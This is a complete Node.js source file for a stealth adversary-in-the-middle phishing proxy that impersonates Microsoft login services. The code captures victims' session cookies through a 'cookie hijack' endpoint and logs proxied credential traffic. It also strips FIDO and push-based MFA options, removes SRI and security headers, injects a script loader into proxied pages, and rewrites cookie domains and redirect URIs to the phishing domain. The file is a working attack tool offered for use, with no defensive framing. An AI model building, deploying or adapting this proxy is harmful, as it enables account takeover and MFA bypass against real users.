// ============================================================
// FINAL STEALTH PROXY SERVER – EvilWorker Core + Carlos Tactics
// Customized for file paths:
//   portal_a7x9k.html, error_4m2p.html, worker_8t2r.js, assets/bundle_x9f3.js
// ============================================================
// Usage: node proxy_server.js
// Environment variables:
//   ENCRYPTION_KEY  (32-char hex, default random)
//   PHISHING_DOMAIN (your domain, e.g., app.azurewebsites.net)
//   REDIRECT_URL    (fallback, e.g., https://google.com)
//   TARGET_HOST     (real service, e.g., login.microsoftonline.com)
// ============================================================

import { createServer } from 'http';
import { request as httpsRequest } from 'https';
import { request as httpRequest } from 'http';
import { createReadStream, existsSync, mkdirSync, createWriteStream } from 'fs';
import { join } from 'path';
import { createCipheriv, randomBytes } from 'crypto';
import { gunzip, inflate, brotliDecompress, zstdDecompress, gzip, deflate, brotliCompress, zstdCompress } from 'zlib';
import { promisify } from 'util';

// ---- Promisify zlib for async/await ----
const gunzipAsync = promisify(gunzip);
const inflateAsync = promisify(inflate);
const brotliDecompressAsync = promisify(brotliDecompress);
const zstdDecompressAsync = promisify(zstdDecompress);
const gzipAsync = promisify(gzip);
const deflateAsync = promisify(deflate);
const brotliCompressAsync = promisify(brotliCompress);
const zstdCompressAsync = promisify(zstdCompress);

// ---- Configuration (from environment) ----
const ENCRYPTION_KEY = process.env.ENCRYPTION_KEY || randomBytes(32).toString('hex');
const PHISHING_DOMAIN = process.env.PHISHING_DOMAIN || 'localhost';
const REDIRECT_URL = process.env.REDIRECT_URL || 'https://www.google.com';
const TARGET_HOST = process.env.TARGET_HOST || 'login.microsoftonline.com';

console.log('[CONFIG] ENCRYPTION_KEY set:', ENCRYPTION_KEY.substring(0, 8) + '...');
console.log('[CONFIG] PHISHING_DOMAIN:', PHISHING_DOMAIN);
console.log('[CONFIG] REDIRECT_URL:', REDIRECT_URL);
console.log('[CONFIG] TARGET_HOST:', TARGET_HOST);

// ---- Bidirectional domain mapping (Carlos technique) ----
const SUBDOMAIN_MAPPING = {
  [PHISHING_DOMAIN]: TARGET_HOST,
  [`login.${PHISHING_DOMAIN}`]: 'login.microsoft.com',
  [`office.${PHISHING_DOMAIN}`]: 'www.office.com',
  [`cdn.${PHISHING_DOMAIN}`]: 'aadcdn.msftauth.net',
  [`static.${PHISHING_DOMAIN}`]: 'aadcdn.msauth.net',
  [`live.${PHISHING_DOMAIN}`]: 'login.live.com'
};
const REVERSE_MAPPING = {};
for (const [phish, real] of Object.entries(SUBDOMAIN_MAPPING)) {
  REVERSE_MAPPING[real] = phish;
}

console.log('[CONFIG] SUBDOMAIN_MAPPING:', SUBDOMAIN_MAPPING);

// ---- Obfuscated entry point - looks like OAuth ----
const ENTRY_PATH = '/auth/start';
const TARGET_PARAM = 'dest';

// ---- File paths (matching your custom names) ----
const FILES = {
  index: 'portal_a7x9k.html',
  notFound: 'error_4m2p.html',
  script: 'assets/bundle_x9f3.js'
};
const PATHS = {
  relay: '/api/gateway',
  serviceWorker: '/worker_8t2r.js',
  script: '/assets/bundle_x9f3.js',
  nav: '/api/nav',
  session: '/api/session'
};

console.log('[CONFIG] ENTRY_PATH:', ENTRY_PATH);
console.log('[CONFIG] TARGET_PARAM:', TARGET_PARAM);
console.log('[CONFIG] FILES:', FILES);
console.log('[CONFIG] PATHS:', PATHS);

// ---- Logging directory ----
const LOG_DIR = join(process.cwd(), 'data');
if (!existsSync(LOG_DIR)) mkdirSync(LOG_DIR);
console.log('[CONFIG] LOG_DIR:', LOG_DIR);
const logStreams = {};

// ---- Session store ----
const sessions = {};

// ============================================================
// MAIN PROXY ENGINE CLASS
// ============================================================
class StealthProxy {
  constructor() {
    this.encryptionKey = ENCRYPTION_KEY;
    this.phishingDomain = PHISHING_DOMAIN;
    this.redirectUrl = REDIRECT_URL;
    this.targetHost = TARGET_HOST;
    this.subdomainMap = SUBDOMAIN_MAPPING;
    this.reverseMap = REVERSE_MAPPING;
    console.log('[PROXY] Constructor done');
  }

  // ---- HTTP Server entry ----
  start(port = process.env.PORT || 3000) {
    const server = createServer(this._onRequest.bind(this));
    server.listen(port, () => console.log(`[PROXY] Proxy running on port ${port}`));
  }

  // ---- Request handler ----
  async _onRequest(req, res) {
    const { method, url, headers } = req;
    console.log(`[REQUEST] ${method} ${url} (from ${headers.host})`);

    const sessionId = this._getSession(headers.cookie);
    console.log(`[REQUEST] sessionId: ${sessionId || 'none'}`);

    // ---- Preflight (OPTIONS) handling (Carlos technique) ----
    if (method === 'OPTIONS') {
      console.log('[REQUEST] OPTIONS preflight request');
      res.writeHead(204, {
        'Access-Control-Allow-Origin': `https://${headers.host}`,
        'Access-Control-Allow-Methods': 'GET, POST, PUT, DELETE, OPTIONS',
        'Access-Control-Allow-Headers': 'Content-Type, Authorization, Cookie, Set-Cookie',
        'Access-Control-Allow-Credentials': 'true',
        'Access-Control-Max-Age': '86400'
      });
      res.end();
      return;
    }

    // ---- Serve index page (phishing entry) ----
    if (url.startsWith(ENTRY_PATH) && url.includes(TARGET_PARAM)) {
      console.log('[REQUEST] ✅ Matching ENTRY_PATH – serving landing page');
      return this._serveLandingPage(req, res, url);
    }

    // ---- Handle known paths ----
    if (url === PATHS.serviceWorker) {
      console.log('[REQUEST] ✅ Serving Service Worker:', url);
      return this._serveFile(res, PATHS.serviceWorker.slice(1), 'text/javascript');
    }
    if (url === PATHS.script) {
      console.log('[REQUEST] ✅ Serving Script:', url);
      return this._serveFile(res, FILES.script, 'text/javascript');
    }
    if (url === PATHS.relay && !sessionId) {
      console.log('[REQUEST] ✅ Anonymous relay request');
      return this._handleAnonymousRelay(req, res);
    }

    // ---- Authenticated session or relay endpoint ----
    if (sessionId || url === PATHS.relay) {
      if (url === PATHS.session) {
        console.log('[REQUEST] ✅ Cookie hijack endpoint');
        return this._handleCookieHijack(req, res, sessionId);
      }
      if (url === PATHS.nav) {
        console.log('[REQUEST] ✅ Navigation rewrite endpoint');
        return this._handleNavRewrite(req, res, sessionId);
      }
      console.log('[REQUEST] ✅ Proxying request (session or relay)');
      return this._handleProxiedRequest(req, res, sessionId);
    }

    // ---- Fallback ----
    console.log(`[REQUEST] ❌ No route matched – redirecting to ${this.redirectUrl}`);
    res.writeHead(302, { Location: this.redirectUrl });
    res.end();
  }

  // ---- Serve landing page ----
  _serveLandingPage(req, res, url) {
    console.log('[LANDING] _serveLandingPage called');
    console.log('[LANDING] URL:', url);
    try {
      const match = url.match(new RegExp(`(?<=${TARGET_PARAM}=)[^&]+`));
      console.log('[LANDING] Regex match result:', match);
      if (!match) throw new Error('No target parameter found');

      const target = new URL(decodeURIComponent(match[0]));
      console.log('[LANDING] Target extracted:', target.href);

      let sessionId = this._getSession(req.headers.cookie);
      if (!sessionId) {
        const { name, value } = this._createSession(target);
        res.setHeader('Set-Cookie', `${name}=${value}; Max-Age=7776000; Secure; HttpOnly; SameSite=Strict`);
        sessionId = name;
        console.log('[LANDING] New session created:', sessionId);
      }
      sessions[sessionId].target = {
        protocol: target.protocol,
        hostname: target.hostname,
        port: target.port || (target.protocol === 'https:' ? 443 : 80),
        path: target.pathname + target.search,
        host: target.host
      };
      console.log('[LANDING] Serving index file:', FILES.index);
      res.writeHead(200, { 'Content-Type': 'text/html' });
      createReadStream(FILES.index).pipe(res);
    } catch (e) {
      console.log('[LANDING] ❌ Error:', e.message);
      res.writeHead(404);
      createReadStream(FILES.notFound).pipe(res);
    }
  }

  // ---- Serve static file ----
  _serveFile(res, filePath, mime) {
    console.log('[SERVE] Serving file:', filePath);
    res.writeHead(200, { 'Content-Type': mime });
    createReadStream(filePath).pipe(res);
  }

  // ---- Session management ----
  _getSession(cookieHeader) {
    if (!cookieHeader) return null;
    const cookies = cookieHeader.split('; ');
    for (const c of cookies) {
      const [name, value] = c.split('=');
      if (sessions[name] && sessions[name].value === value) {
        console.log('[SESSION] Found session:', name);
        return name;
      }
    }
    return null;
  }

  _createSession(target) {
    const name = `_sess_${Math.random().toString(36).slice(2, 10)}`;
    const value = randomBytes(16).toString('hex');
    sessions[name] = { value, cookies: [], logFile: `${target.hostname}_${Date.now()}` };
    const stream = createWriteStream(join(LOG_DIR, sessions[name].logFile), { flags: 'a' });
    logStreams[name] = stream;
    console.log('[SESSION] Created:', name);
    return { name, value };
  }

  // ---- Logging (encrypted AES-256-CTR) ----
  async _log(sessionId, data) {
    const stream = logStreams[sessionId];
    if (!stream) return;
    const iv = randomBytes(16);
    const cipher = createCipheriv('aes-256-ctr', this.encryptionKey, iv);
    const encrypted = Buffer.concat([cipher.update(JSON.stringify(data), 'utf8'), cipher.final()]);
    const entry = JSON.stringify({ iv: iv.toString('hex'), data: encrypted.toString('hex') });
    stream.write(entry + '\n');
  }

  // ---- Handle anonymous relay (no session) ----
  async _handleAnonymousRelay(req, res) {
    console.log('[ANON_RELAY] Called');
    const url = new URL(req.url, `http://${req.headers.host}`);
    const targetParam = url.searchParams.get('target');
    console.log('[ANON_RELAY] target param:', targetParam);
    if (!targetParam) {
      console.log('[ANON_RELAY] ❌ No target param – redirecting');
      res.writeHead(302, { Location: this.redirectUrl });
      return res.end();
    }
    try {
      const target = new URL(decodeURIComponent(targetParam));
      console.log('[ANON_RELAY] Target:', target.href);
      const { name, value } = this._createSession(target);
      res.setHeader('Set-Cookie', `${name}=${value}; Max-Age=7776000; Secure; HttpOnly; SameSite=Strict`);
      sessions[name].target = {
        protocol: target.protocol,
        hostname: target.hostname,
        port: target.port || (target.protocol === 'https:' ? 443 : 80),
        path: target.pathname + target.search,
        host: target.host
      };
      const redirect = `${sessions[name].target.protocol}//${req.headers.host}${sessions[name].target.path}`;
      console.log('[ANON_RELAY] Redirecting to:', redirect);
      res.writeHead(302, { Location: redirect });
      res.end();
    } catch (e) {
      console.log('[ANON_RELAY] ❌ Error:', e.message);
      res.writeHead(404);
      createReadStream(FILES.notFound).pipe(res);
    }
  }

  // ---- Handle cookie hijack ----
  async _handleCookieHijack(req, res, sessionId) {
    console.log('[COOKIE] Cookie hijack endpoint');
    let body = '';
    req.on('data', chunk => body += chunk);
    req.on('end', () => {
      console.log('[COOKIE] Received cookie:', body.substring(0, 50) + '...');
      if (sessionId) {
        this._updateCookies(sessionId, [body], req.headers.host);
        const domains = this._getValidDomains([req.headers.host, sessions[sessionId].target.hostname]);
        console.log('[COOKIE] Returning valid domains:', domains);
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify(domains));
      } else {
        console.log('[COOKIE] ❌ No session ID');
        res.writeHead(403);
        res.end();
      }
    });
  }

  // ---- Handle navigation rewrite (MutationObserver) ----
  async _handleNavRewrite(req, res, sessionId) {
    console.log('[NAV] Navigation rewrite endpoint');
    const url = new URL(req.url, `http://${req.headers.host}`);
    const targetParam = url.searchParams.get(TARGET_PARAM);
    console.log('[NAV] Target param:', targetParam);
    if (!targetParam) {
      console.log('[NAV] ❌ No target param');
      res.writeHead(400);
      return res.end();
    }
    try {
      const target = new URL(decodeURIComponent(targetParam));
      console.log('[NAV] Target:', target.href);
      if (sessionId) {
        sessions[sessionId].target = {
          protocol: target.protocol,
          hostname: target.hostname,
          port: target.port || (target.protocol === 'https:' ? 443 : 80),
          path: target.pathname + target.search,
          host: target.host
        };
      }
      const redirect = `${sessions[sessionId].target.protocol}//${req.headers.host}${sessions[sessionId].target.path}`;
      console.log('[NAV] Redirecting to:', redirect);
      res.writeHead(302, { Location: redirect });
      res.end();
    } catch (e) {
      console.log('[NAV] ❌ Error:', e.message);
      res.writeHead(404);
      createReadStream(FILES.notFound).pipe(res);
    }
  }

  // ---- Main proxy handler ----
  async _handleProxiedRequest(req, res, sessionId) {
    console.log('[PROXY] Main proxy handler');
    const { method, headers, url } = req;
    const session = sessions[sessionId];
    if (!session) {
      console.log('[PROXY] ❌ No session found');
      res.writeHead(302, { Location: this.redirectUrl });
      return res.end();
    }

    // Determine target from query param (for relay) or session target
    let targetUrl;
    const parsed = new URL(url, `http://${headers.host}`);
    console.log('[PROXY] Parsed URL:', parsed.href);

    if (parsed.pathname === PATHS.relay) {
      const t = parsed.searchParams.get('target');
      console.log('[PROXY] Relay target param:', t);
      if (t) targetUrl = new URL(decodeURIComponent(t));
    }
    if (!targetUrl) {
      const t = session.target;
      targetUrl = new URL(t.protocol + '//' + t.host + t.path);
    }
    console.log('[PROXY] Final target URL:', targetUrl.href);

    // ---- Domain rewriting via mapping ----
    let targetHostname = targetUrl.hostname;
    if (this.subdomainMap[targetHostname]) {
      targetHostname = this.subdomainMap[targetHostname];
      targetUrl.hostname = targetHostname;
      console.log('[PROXY] Mapped hostname to:', targetHostname);
    }
    let effectiveHost = headers.host;
    if (this.subdomainMap[effectiveHost]) {
      effectiveHost = this.subdomainMap[effectiveHost];
      console.log('[PROXY] Mapped host header to:', effectiveHost);
    }

    const isNav = headers['sec-fetch-mode'] === 'navigate' || headers['upgrade-insecure-requests'] === '1';
    if (isNav) {
      console.log('[PROXY] Navigation request detected');
      session.target = {
        protocol: targetUrl.protocol,
        hostname: targetHostname,
        port: targetUrl.port || (targetUrl.protocol === 'https:' ? 443 : 80),
        path: targetUrl.pathname + targetUrl.search,
        host: effectiveHost
      };
    }

    // Forward request to target
    const options = {
      hostname: targetHostname,
      port: targetUrl.port || (targetUrl.protocol === 'https:' ? 443 : 80),
      method: method,
      path: targetUrl.pathname + targetUrl.search,
      headers: { ...headers },
      rejectUnauthorized: false
    };
    delete options.headers.host;
    options.headers.host = effectiveHost;

    // Remove unwanted headers
    const dropHeaders = [
      'x-forwarded-for', 'x-arr-log-id', 'client-ip', 'x-site-deployment-id',
      'x-canary', 'x-microsoft-telemetry', 'x-ms-telemetry', 'x-ms-request-id',
      'x-forwarded-proto', 'x-appservice-proto', 'x-arr-ssl', 'x-forwarded-tlsversion',
      'x-original-url', 'x-waws-unencoded-url', 'x-client-ip', 'x-client-port'
    ];
    for (const h of dropHeaders) delete options.headers[h];

    console.log('[PROXY] Options:', JSON.stringify(options, null, 2).substring(0, 200) + '...');

    // Prepare request body
    let bodyBuffer = [];
    req.on('data', chunk => bodyBuffer.push(chunk));
    req.on('end', async () => {
      const body = Buffer.concat(bodyBuffer);
      console.log('[PROXY] Request body length:', body.length);
      const proto = targetUrl.protocol === 'https:' ? httpsRequest : httpRequest;
      const proxyReq = proto(options, (proxyRes) => {
        console.log('[PROXY] Response status:', proxyRes.statusCode);

        // Log transaction
        this._log(sessionId, {
          time: new Date().toISOString(),
          url: targetUrl.href,
          method: method,
          status: proxyRes.statusCode,
          headers: proxyRes.headers,
          body: body.toString('utf8')
        }).catch(() => {});

        let isJson = proxyRes.headers['content-type']?.includes('application/json');
        let isHtml = proxyRes.headers['content-type']?.includes('text/html');
        let responseBody = [];
        proxyRes.on('data', chunk => responseBody.push(chunk));
        proxyRes.on('end', async () => {
          let fullBody = Buffer.concat(responseBody);
          console.log('[PROXY] Response body length:', fullBody.length);

          // Decompress if needed
          let encodings = [];
          if (proxyRes.headers['content-encoding']) {
            encodings = proxyRes.headers['content-encoding'].split(',').map(e => e.trim());
            console.log('[PROXY] Encodings:', encodings);
            for (let enc of encodings) {
              try {
                if (enc === 'gzip') fullBody = await gunzipAsync(fullBody);
                else if (enc === 'deflate') fullBody = await inflateAsync(fullBody);
                else if (enc === 'br') fullBody = await brotliDecompressAsync(fullBody);
                else if (enc === 'zstd') fullBody = await zstdDecompressAsync(fullBody);
              } catch (e) {}
            }
          }

          // ---- JSON MFA downgrade ----
          if (isJson && targetUrl.pathname.includes('/common/login')) {
            console.log('[PROXY] MFA downgrade – JSON detected');
            try {
              const json = JSON.parse(fullBody.toString('utf8'));
              if (json.arrUserProofs) {
                const originalCount = json.arrUserProofs.length;
                json.arrUserProofs = json.arrUserProofs.filter(
                  m => m.authMethodId !== 'FidoKey' && m.authMethodId !== 'PhoneAppNotification'
                );
                console.log(`[PROXY] MFA downgrade: removed ${originalCount - json.arrUserProofs.length} methods`);
                if (json.arrUserProofs.length === 0) {
                  json.arrUserProofs.push({
                    authMethodId: 'PhoneAppOTP',
                    data: 'PhoneAppOTP',
                    display: '',
                    isDefault: true,
                    isLocationAware: false,
                    phoneAppTypes: ['MicrosoftAuthenticatorBasedOTP']
                  });
                }
                fullBody = Buffer.from(JSON.stringify(json));
              }
            } catch (e) {
              console.log('[PROXY] MFA downgrade error:', e.message);
            }
          }

          // ---- HTML injection + SRI removal + redirect_uri rewriting ----
          if (isHtml) {
            console.log('[PROXY] HTML response – injecting payload');
            let html = fullBody.toString('utf8');

            // SRI removal
            html = html.replace(/<script[^>]+\s+integrity="[^"]*"/g, '<script');
            html = html.replace(/<link[^>]+\s+integrity="[^"]*"/g, '<link');
            html = html.replace(/integrity\s*=\s*"[^"]*"/g, '');

            // redirect_uri rewriting
            const replaced = html.match(/redirect_uri=https%3A%2F%2Flogin\.microsoftonline\.com/g)?.length || 0;
            html = html.replace(/redirect_uri=https%3A%2F%2Flogin\.microsoftonline\.com/g,
                                `redirect_uri=https%3A%2F%2F${this.phishingDomain}`);
            html = html.replace(/redirect_uri=https:\/\/login\.microsoftonline\.com/g,
                                `redirect_uri=https://${this.phishingDomain}`);
            console.log(`[PROXY] Rewrote ${replaced} redirect_uri occurrences`);

            // Dynamic script injection
            const injectCode = `
              <script>
                (async function() {
                  try {
                    const resp = await fetch('${PATHS.script}');
                    const code = await resp.text();
                    const blob = new Blob([code], { type: 'application/javascript' });
                    const url = URL.createObjectURL(blob);
                    await import(url);
                  } catch(e) {}
                })();
              </script>
            `;
            if (html.includes('</head>')) {
              html = html.replace('</head>', injectCode + '</head>');
              console.log('[PROXY] Injected script before </head>');
            } else if (html.includes('</body>')) {
              html = html.replace('</body>', injectCode + '</body>');
              console.log('[PROXY] Injected script before </body>');
            } else {
              html = injectCode + html;
              console.log('[PROXY] Injected script at start of HTML');
            }
            fullBody = Buffer.from(html);
          }

          // ---- Server‑side Set-Cookie domain rewriting ----
          if (proxyRes.headers['set-cookie']) {
            const originalCookies = proxyRes.headers['set-cookie'];
            console.log('[PROXY] Rewriting Set-Cookie headers');
            let rewrittenCookies = Array.isArray(originalCookies) ? originalCookies : [originalCookies];
            rewrittenCookies = rewrittenCookies.map(cookie => {
              let newCookie = cookie;
              newCookie = newCookie.replace(/Domain=\.?microsoftonline\.com/gi, `Domain=.${this.phishingDomain}`);
              newCookie = newCookie.replace(/Domain=\.?login\.microsoft\.com/gi, `Domain=.${this.phishingDomain}`);
              newCookie = newCookie.replace(/Domain=\.?login\.live\.com/gi, `Domain=.${this.phishingDomain}`);
              newCookie = newCookie.replace(/Domain=\.?aadcdn\.msftauth\.net/gi, `Domain=.${this.phishingDomain}`);
              newCookie = newCookie.replace(/Domain=\.?aadcdn\.msauth\.net/gi, `Domain=.${this.phishingDomain}`);
              return newCookie;
            });
            proxyRes.headers['set-cookie'] = rewrittenCookies.join(', ');
          }

          // ---- Re-compress if needed ----
          if (encodings.length) {
            console.log('[PROXY] Re-compressing response');
            for (let enc of encodings.reverse()) {
              try {
                if (enc === 'gzip') fullBody = await gzipAsync(fullBody);
                else if (enc === 'deflate') fullBody = await deflateAsync(fullBody);
                else if (enc === 'br') fullBody = await brotliCompressAsync(fullBody);
                else if (enc === 'zstd') fullBody = await zstdCompressAsync(fullBody);
              } catch (e) {}
            }
          }

          // ---- Send response ----
          const newHeaders = { ...proxyRes.headers };
          delete newHeaders['content-security-policy'];
          delete newHeaders['x-frame-options'];
          delete newHeaders['x-xss-protection'];
          delete newHeaders['x-content-type-options'];
          delete newHeaders['cross-origin-opener-policy'];
          delete newHeaders['cross-origin-embedder-policy'];
          delete newHeaders['cross-origin-resource-policy'];
          delete newHeaders['permissions-policy'];
          delete newHeaders['service-worker-allowed'];
          newHeaders['cache-control'] = 'no-store';
          newHeaders['access-control-allow-origin'] = `https://${req.headers.host}`;
          if (newHeaders['content-length']) {
            newHeaders['content-length'] = fullBody.length;
          }
          console.log('[PROXY] Sending response status:', proxyRes.statusCode);
          res.writeHead(proxyRes.statusCode, newHeaders);
          res.end(fullBody);
        });
      });

      proxyReq.on('error', (e) => {
        console.error('[PROXY] ❌ Proxy request error:', e.message);
        res.writeHead(502);
        res.end();
      });
      if (body.length) proxyReq.write(body);
      proxyReq.end();
    });
  }

  // ---- Cookie update helper ----
  _updateCookies(sessionId, newCookies, host) {
    const session = sessions[sessionId];
    if (!session) return;
    for (const cookie of newCookies) {
      session.cookies.push(cookie);
    }
  }

  _getValidDomains(domains) {
    const result = [];
    for (const d of domains) {
      const parts = d.split('.');
      for (let i = 2; i <= parts.length; i++) {
        const sub = parts.slice(-i).join('.');
        if (!result.includes(sub)) result.push(sub);
      }
    }
    return result;
  }
}

// ---- Start server ----
console.log('[MAIN] Starting proxy server...');
const proxy = new StealthProxy();
proxy.start();
console.log('[MAIN] Proxy started successfully');
